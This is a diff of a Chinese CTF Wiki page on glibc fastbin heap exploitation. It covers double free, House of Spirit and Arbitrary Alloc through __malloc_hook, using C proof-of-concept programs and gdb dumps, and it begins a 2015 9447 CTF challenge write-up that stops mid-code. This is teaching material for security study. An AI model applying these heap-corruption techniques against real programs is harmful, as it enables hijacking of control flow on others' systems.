@@ -7,7 +7,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml" lang="zh_CN">
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <title>fastbin attack &#8212; CTF Wiki </title>
+    <title>Fastbin Attack &#8212; CTF Wiki </title>
     <link rel="stylesheet" href="../../_static/cloud.css" type="text/css" />
     <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
     <link rel="stylesheet" href="../../_static/css/custom.css" type="text/css" />
@@ -65,24 +65,25 @@
           <div class="body" role="main">
             
   <div class="section" id="fastbin-attack">
-<h1>fastbin attack<a class="headerlink" href="#fastbin-attack" title="永久链接至标题">¶</a></h1>
+<h1>Fastbin Attack<a class="headerlink" href="#fastbin-attack" title="永久链接至标题">¶</a></h1>
 <div class="section" id="id1">
 <h2>介绍<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
 <p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p>
 <ul class="simple">
-<li>存在堆溢出、use-after-free等能控制chunk内容的漏洞</li>
-<li>漏洞发生于fastbin的chunk中</li>
+<li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li>
+<li>漏洞发生于 fastbin 类型的 chunk 中</li>
 </ul>
 <p>如果细分的话，可以做如下的分类：</p>
 <ul class="simple">
-<li>fastbin double free</li>
+<li>Fastbin Double Free</li>
 <li>House of Spirit</li>
-<li>arbitrary alloc</li>
+<li>Arbitrary Alloc</li>
 </ul>
 </div>
 <div class="section" id="id2">
 <h2>原理<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h2>
-<p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放其 next_chunk 的 pre_inuse 位也不会被置为空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。</p>
+<p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk
+的。</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="n">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
@@ -113,7 +114,7 @@
 <span class="mh">0x6020c0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000020f41</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk</span>
 </pre></div>
 </div>
-<p>执行三个free进行释放后</p>
+<p>执行三次 free 进行释放后</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x602000</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000041</span> <span class="o">&lt;===</span> <span class="n">chunk1</span>
 <span class="mh">0x602010</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
 <span class="mh">0x602020</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
@@ -129,7 +130,7 @@
 <span class="mh">0x6020c0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000020f41</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk</span>
 </pre></div>
 </div>
-<p>此时位于main_arena中的 fastbin 链表中已经储存了指向chunk3的指针，并且chunk3、2、1构成了一个单链表</p>
+<p>此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1构成了一个单链表</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x30</span><span class="p">,</span><span class="n">ptr</span><span class="o">=</span><span class="mh">0x602080</span><span class="p">]</span>
 <span class="o">===&gt;</span><span class="n">Chunk</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mh">0x602040</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">)</span>
 <span class="o">===&gt;</span><span class="n">Chunk</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mh">0x602000</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">)</span>
@@ -139,15 +140,15 @@
 <p>我们可以使用如下的图片来表示这一点 <img alt="image0" src="../../_images/fastbin_link_list.png" /></p>
 </div>
 <div class="section" id="fastbin-double-free">
-<h2>fastbin double free<a class="headerlink" href="#fastbin-double-free" title="永久链接至标题">¶</a></h2>
+<h2>Fastbin Double Free<a class="headerlink" href="#fastbin-double-free" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id3">
 <h3>介绍<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h3>
-<p>fastbin double free 是指 fastbin 的 chunk 可以被多次释放并多次的存在于fastbin链表中。这样导致的后果是多次分配可以从 fastbin
+<p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin
 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。</p>
-<p>fastbin double free之所以能够成功的实现有两部分的原因</p>
+<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
 <ol class="arabic simple">
-<li>fastbin 的堆块被释放后next_chunk的pre_inuse位不会被清空</li>
-<li>fastbin 在执行free的时候仅验证了main_arena直接指向的块</li>
+<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
+<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，对于链表后面的块，并没有进行验证。</li>
 </ol>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/*</span> <span class="n">Another</span> <span class="n">simple</span> <span class="n">check</span><span class="p">:</span> <span class="n">make</span> <span class="n">sure</span> <span class="n">the</span> <span class="n">top</span> <span class="n">of</span> <span class="n">the</span> <span class="nb">bin</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">the</span>
        <span class="n">record</span> <span class="n">we</span> <span class="n">are</span> <span class="n">going</span> <span class="n">to</span> <span class="n">add</span> <span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="p">,</span> <span class="n">double</span> <span class="n">free</span><span class="p">)</span><span class="o">.</span>  <span class="o">*/</span>
@@ -174,7 +175,7 @@
 <span class="p">}</span>
 </pre></div>
 </div>
-<p>如果你执行这个程序，不出意外的话会得到如下的结果，这正是_int_free函数检测到了fastbin的double free。</p>
+<p>如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span>*** Error in `./tst&#39;: double free or corruption (fasttop): 0x0000000002200010 ***
 ======= Backtrace: =========
 /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]
@@ -211,7 +212,7 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 已放弃 (核心已转储)
 </pre></div>
 </div>
-<p>如果我们在chunk1释放后，再释放chunk2，这样main_arena就指向chunk2而不是chunk1了，此时我们再去释放chunk1就不再会被检测到。</p>
+<p>如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="n">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
@@ -226,13 +227,20 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 </pre></div>
 </div>
 <p>第一次释放<code class="docutils literal"><span class="pre">free(chunk1)</span></code></p>
-<p><img alt="image1" src="../../_images/fastbin_free_chunk1.png" /></p>
+<div class="figure">
+<img alt="" src="../../_images/fastbin_free_chunk1.png" />
+</div>
 <p>第二次释放<code class="docutils literal"><span class="pre">free(chunk2)</span></code></p>
-<p><img alt="image2" src="../../_images/fastbin_free_chunk2.png" /></p>
+<div class="figure">
+<img alt="" src="../../_images/fastbin_free_chunk2.png" />
+</div>
 <p>第三次释放<code class="docutils literal"><span class="pre">free(chunk1)</span></code></p>
-<p><img alt="image3" src="../../_images/fastbin_free_chunk3.png" /></p>
-<p>注意因为chunk1被再次释放因此其 fd 值不再为0而是指向chunk2，这时如果我们可以控制chunk1的内容，便可以写入其fd指针从而实现在我们想要的任意地址分配fastbin块。
-下面这个示例演示了这一点，首先跟前面一样构造main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1的链表。之后第一次调用malloc返回chunk1之后修改chunk1的fd指针指向bss段上的bss_chunk，之后我们可以看到fastbin会把堆块分配到这里。</p>
+<div class="figure">
+<img alt="" src="../../_images/fastbin_free_chunk3.png" />
+</div>
+<p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。
+下面这个示例演示了这一点，首先跟前面一样构造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin
+会把堆块分配到这里。</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">typedef</span> <span class="n">struct</span> <span class="n">_chunk</span>
 <span class="p">{</span>
     <span class="n">long</span> <span class="n">long</span> <span class="n">pre_size</span><span class="p">;</span>
@@ -266,7 +274,7 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 <span class="p">}</span>
 </pre></div>
 </div>
-<p>在我的系统上chunk_b输出的值会是0x601090，这个值位于bss段中正是我们之前设置的<code class="docutils literal"><span class="pre">CHUNK</span> <span class="pre">bss_chunk</span></code></p>
+<p>在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于bss段中正是我们之前设置的<code class="docutils literal"><span class="pre">CHUNK</span> <span class="pre">bss_chunk</span></code></p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Start</span>              <span class="n">End</span>                <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
 <span class="mh">0x0000000000400000</span> <span class="mh">0x0000000000401000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">Ox9A82</span><span class="o">/</span><span class="n">tst</span><span class="o">/</span><span class="n">tst</span>
 <span class="mh">0x0000000000600000</span> <span class="mh">0x0000000000601000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">--</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">Ox9A82</span><span class="o">/</span><span class="n">tst</span><span class="o">/</span><span class="n">tst</span>
@@ -280,7 +288,7 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 <span class="mh">0x6010c0</span><span class="p">:</span>               <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
 </pre></div>
 </div>
-<p>值得注意的是我们在main函数的第一步就进行了<code class="docutils literal"><span class="pre">bss_chunk.size=0x21;</span></code>的操作，这是因为_int_malloc会对欲分配位置的size域进行验证，如果其size与当前fastbin链表应有size不符就会抛出异常。</p>
+<p>值得注意的是，我们在 main 函数的第一步就进行了<code class="docutils literal"><span class="pre">bss_chunk.size=0x21;</span></code>的操作，这是因为_int_malloc会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span>*** Error in `./tst&#39;: malloc(): memory corruption (fast): 0x0000000000601090 ***
 ======= Backtrace: =========
 /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]
@@ -317,7 +325,7 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 已放弃 (核心已转储)
 </pre></div>
 </div>
-<p>_int_malloc中的校验如下</p>
+<p>_int_malloc 中的校验如下</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fastbin_index</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">))</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
     <span class="p">{</span>
       <span class="n">errstr</span> <span class="o">=</span> <span class="s2">&quot;malloc(): memory corruption (fast)&quot;</span><span class="p">;</span>
@@ -330,8 +338,8 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 </div>
 <div class="section" id="id5">
 <h3>小总结<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h3>
-<p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。
-如果更进一步修改fd指针，则能够实现任意地址分配堆块的效果(首先要通过验证)，这就相当于任意地址写任意值的效果。</p>
+<p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd
+指针，则能够实现任意地址分配堆块的效果(首先要通过验证)，这就相当于任意地址写任意值的效果。</p>
 </div>
 </div>
 <div class="section" id="house-of-spirit">
@@ -340,12 +348,12 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 <h3>介绍<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h3>
 <p>House of Spirit 是 House of XX 的一种，House of XX 是 2004 年左右的一篇关于 Linux 堆利用的技术文章中提出一系列利用方法。 HOS 可以使得 fastbin
 堆块分配到栈中，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
-<p>如果你已经理解了前文所讲的fastbin double free，那么相信你理解HOS就已经不成问题了，其实它们的本质都在于 fastbin 链表是使用当前 chunk 的 fd 指针指向下一个chunk构成的。 HOS 的核心同样在于劫持 fastbin
-链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，实现控制栈中数据。</p>
+<p>如果你已经理解了前文所讲的 Fastbin Double Free，那么理解 HOS 就已经不成问题了，它们的本质都在于 fastbin 链表的构成特性：当前 chunk 的 fd 指针指向下一个 chunk。 HOS 的核心同样在于劫持 fastbin 链表中
+chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，实现控制栈中数据。</p>
 </div>
 <div class="section" id="id7">
 <h3>演示<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h3>
-<p>这次我们把fake_chunk置于栈中称为stack_chunk，同时劫持了fastbin链表中chunk的fd值，通过把这个fd值指向stack_chunk就可以实现在栈中分配fastbin chunk。</p>
+<p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">typedef</span> <span class="n">struct</span> <span class="n">_chunk</span>
 <span class="p">{</span>
     <span class="n">long</span> <span class="n">long</span> <span class="n">pre_size</span><span class="p">;</span>
@@ -373,13 +381,13 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 <span class="p">}</span>
 </pre></div>
 </div>
-<p>通过gdb调试可以看到我们首先把chunk1的fd指针指向了stack_chunk</p>
+<p>通过gdb调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x602000</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000021</span> <span class="o">&lt;===</span> <span class="n">chunk1</span>
 <span class="mh">0x602010</span><span class="p">:</span>   <span class="mh">0x00007fffffffde60</span>  <span class="mh">0x0000000000000000</span>
 <span class="mh">0x602020</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000020fe1</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk</span>
 </pre></div>
 </div>
-<p>之后第一次malloc使得fastbin链表指向了stack_chunk，这意味着下一次分配会使用stack_chunk的内存进行</p>
+<p>之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x7ffff7dd1b20</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">&gt;</span><span class="p">:</span>    <span class="mh">0x0000000000000000</span> <span class="o">&lt;===</span> <span class="n">unsorted</span> <span class="nb">bin</span>
 <span class="mh">0x7ffff7dd1b28</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>  <span class="mh">0x00007fffffffde60</span> <span class="o">&lt;===</span> <span class="n">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
 <span class="mh">0x7ffff7dd1b30</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>
@@ -414,19 +422,19 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 </div>
 <div class="section" id="id8">
 <h3>小总结<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h3>
-<p>通过HOS我们可以把fastbin chunk分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin中chunk的fd域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。</p>
+<p>通过 HOS 我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。</p>
 </div>
 </div>
 <div class="section" id="arbitrary-alloc">
-<h2>arbitrary alloc<a class="headerlink" href="#arbitrary-alloc" title="永久链接至标题">¶</a></h2>
+<h2>Arbitrary Alloc<a class="headerlink" href="#arbitrary-alloc" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id9">
 <h3>介绍<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h3>
-<p>arbitrary alloc 其实与 House of Spirit 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的size域，我们可以把chunk分配到任意的可写内存中，比如bss、heap、data、stack等等。</p>
+<p>Arbitrary Alloc 其实与 House of Spirit 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的size域，我们可以把chunk分配到任意的可写内存中，比如bss、heap、data、stack等等。</p>
 <p>大家可能会认为 HOS 与 arbitrary alloc 没有什么区别，因此没有必要分为两类。相信看完下面的一个例子，就会有不一样的想法了。</p>
 </div>
 <div class="section" id="id10">
 <h3>演示<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
-<p>在这个例子，我们使用字节错位来实现直接分配fastbin到<strong>_malloc_hook的位置，相当于覆盖_malloc_hook来控制程序流程。</strong></p>
+<p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到<strong>_malloc_hook的位置，相当于覆盖_malloc_hook来控制程序流程。</strong></p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
 <span class="p">{</span>
 
@@ -466,7 +474,7 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 <span class="mh">0x7ffff7dd1b10</span> <span class="o">&lt;</span><span class="n">__malloc_hook</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x30</span>    <span class="mh">0x28</span>    <span class="mh">0xa9</span>    <span class="mh">0xf7</span>    <span class="mh">0xff</span>    <span class="mh">0x7f</span>    <span class="mh">0x0</span> <span class="mh">0x0</span>
 </pre></div>
 </div>
-<p>0x7ffff7dd1b10是我们想要控制的__malloc_hook的地址，于是我们向上寻找是否可以错位出一个合法的size域。因为这个程序是64位的，因此fastbin的范围为32字节到128字节(0x20-0x80)，如下：</p>
+<p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的size域。因为这个程序是 64 位的，因此 fastbin 的范围为32字节到128字节(0x20-0x80)，如下：</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span>//这里的size指用户区域，因此要小2倍SIZE_SZ
 Fastbins[idx=0, size=0x10]
 Fastbins[idx=1, size=0x20]
@@ -477,19 +485,19 @@ Fastbins[idx=5, size=0x60]
 Fastbins[idx=6, size=0x70]
 </pre></div>
 </div>
-<p>通过观察发现0x7ffff7dd1af5处可以现实错位构造出一个0x000000000000007f</p>
+<p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个0x000000000000007f</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x7ffff7dd1af0</span> <span class="mh">0x60</span> <span class="mh">0x2</span> <span class="mh">0xdd</span> <span class="mh">0xf7</span> <span class="mh">0xff</span> <span class="mh">0x7f</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
 <span class="mh">0x7ffff7dd1af8</span> <span class="mh">0x0</span>  <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span> <span class="mh">0x0</span>
 
 <span class="mh">0x7ffff7dd1af5</span> <span class="o">&lt;</span><span class="n">_IO_wide_data_0</span><span class="o">+</span><span class="mi">309</span><span class="o">&gt;</span><span class="p">:</span>   <span class="mh">0x000000000000007f</span>
 </pre></div>
 </div>
-<p>因为0x7f在计算fastbin index时，是属于index 5的，即chunk大小为0x70的。</p>
+<p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p>
 <div class="code c highlight-default"><div class="highlight"><pre><span></span>##define fastbin_index(sz)                                                      \
     ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
 </pre></div>
 </div>
-<p>而其大小又包含了0x10的chunk_header，因此我们选择分配0x60的fastbin，将其加入链表。 最后经过两次分配可以观察到chunk被分配到0x00007ffff7dd1b15，因此我们就可以直接控制__malloc_hook的内容。</p>
+<p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x00007ffff7dd1b15，因此我们就可以直接控制 __malloc_hook的内容。</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span>0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;
  →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax
 
@@ -504,9 +512,324 @@ Fastbins[idx=6, size=0x70]
 </div>
 <div class="section" id="id11">
 <h3>小总结<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
-<p>虽然arbitrary alloc与HOS的原理是相同的，但是arbitrary alloc在CTF中要比HOS更常出现也更加使用。我们可以利用字节错位等方法来绕过size域的检验，实现任意地址分配chunk，最后的效果也就相当于任意地址写任意值。</p>
+<p>虽然 Arbitrary Alloc 与 HOS 的原理是相同的，但是 Arbitrary Alloc 在 CTF 中要比 HOS 使用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配
+chunk，最后的效果也就相当于任意地址写任意值。</p>
 </div>
 </div>
+<div class="section" id="ctf-search-engine">
+<h2>2015 9447 CTF : Search Engine<a class="headerlink" href="#ctf-search-engine" title="永久链接至标题">¶</a></h2>
+<div class="section" id="id12">
+<h3>基本信息<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h3>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2015_9447ctf_search-engine git:(master) file search
+search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped
+➜  2015_9447ctf_search-engine git:(master) checksec search
+[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    FORTIFY:  Enabled
+</pre></div>
+</div>
+</div>
+<div class="section" id="id13">
+<h3>基本功能<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h3>
+<p>程序的基本功能是</p>
+<ul class="simple">
+<li>索引一个句子</li>
+<li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li>
+<li>读取的字符串长度必须和给定的大小相等</li>
+<li>每次索引的句子都是直接在直接建立在前面的句子上的。</li>
+<li>在一个句子中搜索单词</li>
+<li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li>
+<li>读取指定长度字符串</li>
+<li>如果有回车标记<ul>
+<li>在指定长度内没有遇到回车，则读完没有设置NULL标记</li>
+<li>在指定长度内遇到回车，就截断返回。</li>
+</ul>
+</li>
+<li>没有回车标记<ul>
+<li>读够指定长度，没有NULL标记结尾。</li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="section" id="id14">
+<h3>词语结构体<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h3>
+<p>通过分析索引句子的过程，我们可以得到词语的结构如下</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)
+00000000 content         dq ?
+00000008 size            dd ?
+0000000C padding1        dd ?
+00000010 sentence_ptr    dq ?                    ; offset
+00000018 len             dd ?
+0000001C padding2        dd ?
+00000020 next            dq ?                    ; offset
+00000028 word_struct     ends
+</pre></div>
+</div>
+</div>
+<div class="section" id="id15">
+<h3>堆内存相关操作<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h3>
+<p>分配</p>
+<ul class="simple">
+<li>malloc 40 字节为一个word结构体</li>
+<li>为句子或者单词 malloc 指定大小。</li>
+</ul>
+<p>释放</p>
+<ul class="simple">
+<li>释放删除的句子</li>
+<li>释放删除句子所搜索的临时单词</li>
+<li>释放索引句子时未使用的单词结构</li>
+</ul>
+</div>
+<div class="section" id="id16">
+<h3>漏洞<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h3>
+<p><strong>索引句子读取字符串时无NULL结尾</strong></p>
+<p>在索引句子时 flag_enter 永远为 0，所以读取句子时最后没有 NULL 结尾。</p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">_flag_enter</span> <span class="o">=</span> <span class="n">flag_enter</span><span class="p">;</span>
+<span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="n">v4</span><span class="p">];</span>
+  <span class="n">v6</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="n">v4</span><span class="p">],</span> <span class="mi">1</span><span class="n">uLL</span><span class="p">,</span> <span class="mi">1</span><span class="n">uLL</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+    <span class="k">break</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v5</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">_flag_enter</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="o">*</span><span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">v4</span> <span class="o">=</span> <span class="n">v6</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="nb">len</span> <span class="o">&lt;=</span> <span class="n">v6</span> <span class="o">-</span> <span class="mi">1</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">v4</span> <span class="o">+=</span> <span class="n">v6</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="nb">len</span> <span class="o">&lt;=</span> <span class="n">v4</span> <span class="p">)</span>
